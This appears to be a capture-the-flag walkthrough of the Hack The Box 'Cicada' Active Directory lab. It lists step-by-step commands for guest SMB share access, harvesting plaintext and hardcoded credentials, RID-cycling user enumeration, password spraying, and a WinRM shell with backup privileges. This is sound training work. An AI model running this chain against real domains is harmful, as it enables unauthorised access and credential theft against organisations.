<div align="left">

<img src="https://img.shields.io/badge/FuzzRaiders_Team_Member-0a66ff?style=flat-square&logo=github" />
<img src="https://img.shields.io/badge/Anka0x-0f172a?style=flat-square" />
<img src="https://img.shields.io/badge/🎯%20Role-Internal pentest-1e293b?style=flat-square" />
<img src="https://img.shields.io/badge/📜%20Certification-PNPT_(TCM Sec Security)-334155?style=flat-square" />
<img src="https://img.shields.io/badge/🟢%20Status-In_Progress-16a34a?style=flat-square" />

</div>

# Hack The Box: Cicada

<div align="left">

![Category: Active Directory](https://img.shields.io/badge/Category-Active%20Directory-red)<br>
![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-blue)<br>
![Platform: Hack%20The%20Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-darkgreen)

</div>

---

# 📌 Overview

Cicada is a **Windows Active Directory lab** that demonstrates how **poor internal hygiene** leads to full domain compromise without using memory corruption or exploits.

The attack path is driven by:

- SMB share misconfiguration
- Plaintext credential exposure
- Password reuse
- Abuse of Windows privileges (Backup / Restore)
- Authenticated remote access via WinRM

This lab reflects **real enterprise failure chains**, not CTF tricks.

---

## 🛠 Tools Used

The lab was completed using **standard internal Active Directory assessment tooling**, focused on enumeration, credential validation, and authenticated access.

```
nmap                → service discovery and domain controller identification
crackmapexec        → SMB enumeration, password spraying, user discovery
smbclient           → accessing SMB shares and downloading files
impacket-lookupsid  → RID cycling and domain object enumeration
evil-winrm          → authenticated remote access and post-auth checks
```

---

## <h1 style="color:pink;">Walkthrough steps</h1>
### Step 1 Recon (Nmap)

**Goal:** identify services and confirm AD/DC.

**Command(s):**

```bash
nmap -sC -sV -Pn <IP>
```

**What to observe:**

* DNS/Kerberos/LDAP/SMB/WinRM presence
* Host looks like Domain Controller

![images](Images/1.png)
![images](Images/1.1.png)

---

### Step 2 SMB share enumeration (Guest)

**Goal:** check if any shares are accessible anonymously.

**Command(s):**

```bash
crackmapexec smb cicada.htb -u 'guest' -p '' --shares
```

**What to observe:**

* Which shares are readable
* HR / IPC$ access

![images](Images/2.png)
![images](Images/2.1.png)

---

### Step 3 Access HR share + download onboarding file

**Goal:** pull files from readable shares.

**Command(s):**

```bash
smbclient //cicada.htb/HR
ls
get "notice from HR.txt"
```

**What to observe:**

* The share contains an onboarding notice

![images](Images/3.png)

---

### Step 4 Extract leaked password from HR notice

**Goal:** read the file and extract credentials.

**Command(s):**

```bash
cat "notice from HR.txt"
```

**What to observe:**

* Default password disclosed in plaintext

![images](Images/4.png)

---

### Step 5 Enumerate domain users (RID cycling / lookups)

**Goal:** identify valid domain accounts.

**Command(s):**

```bash
impacket-lookupsid cicada.htb/guest@cicada.htb -no-pass
```

**What to observe:**

* domain SID
* user/group objects

![images](Images/5.png)
![images](Images/5.1.png)
![images](Images/5.2.png)
---

### Step 6 Password spraying with discovered password

**Goal:** validate which user(s) reuse the default password.

**Command(s):**

```bash
crackmapexec smb cicada.htb -u users.txt -p '<DEFAULT_PASSWORD>'
```

**What to observe:**

* which username returns successful auth

![images](Images/6.png)
![images](Images/6.1.png)
---

### Step 7 Authenticated enumeration + notes extraction (badpwdcount / description)

**Goal:** enumerate users and mine descriptions for hints.

**Command(s):**

```bash
crackmapexec smb cicada.htb -u michael.wrightson -p '<PASSWORD>' --users
```

**What to observe:**

* user descriptions can contain passwords or hints

![images](Images/7.png)
![images](Images/7.1.png)
---

### Step 8 DEV share: find script with hardcoded credentials

**Goal:** pull scripts/configs from accessible shares.

**Command(s):**

```bash
smbclient //cicada.htb/DEV -U david.orelious
ls
get Backup_script.ps1
```

**What to observe:**

* script exists in DEV share

![images](Images/8.png)

---

### Step 9 Analyze backup script for credentials

**Goal:** extract credentials from code.

**Command(s):**

```bash
cat Backup_script.ps1
```

**What to observe:**

* hardcoded username/password (emily.oscars)

![images](Images/8.1.png)

---

### Step 10 WinRM access + privilege confirmation

**Goal:** login with the leaked credentials and confirm privileges.

**Command(s):**

```bash
evil-winrm -u emily.oscars -p '<PASSWORD>' -i cicada.htb
whoami
whoami /priv
```

**What to observe:**

* interactive shell
* privileges like SeBackupPrivilege / SeRestorePrivilege

![images](Images/9.png)

---

## 🧠 What This Lab Teaches

- Recon discipline in Windows / AD environments
- Why **guest access is never harmless**
- How credentials leak through shares and scripts
- Password reuse impact in enterprise domains
- Privilege awareness (`SeBackupPrivilege`, `SeRestorePrivilege`)
- How attackers escalate **without exploits**

This is foundational knowledge for **Internal Pentesting, Red Teaming, and Exploit Developers** who must understand **pre-exploitation compromise paths**.

---

## 📌 Conclusion

Cicada reinforces a critical real-world lesson:

> **Most environments fall due to misconfiguration and credential exposure not 0-days.**

If an attacker can read the right file or abuse overlooked privileges, **exploitation becomes unnecessary**.

This lab builds the mindset required before moving into **advanced exploitation, post-exploitation, and domain persistence**.

This work is part of FuzzRaiders’ structured hands-on training and research program, where every lab, project, and technical study is formally documented, reviewed, and validated to ensure real world applicability, methodological rigor and real world security execution

Happy hacking 🚀
---

# Author: Anka0X
 ## [LinkedIn:](https://www.linkedin.com/in/manka-sec/)


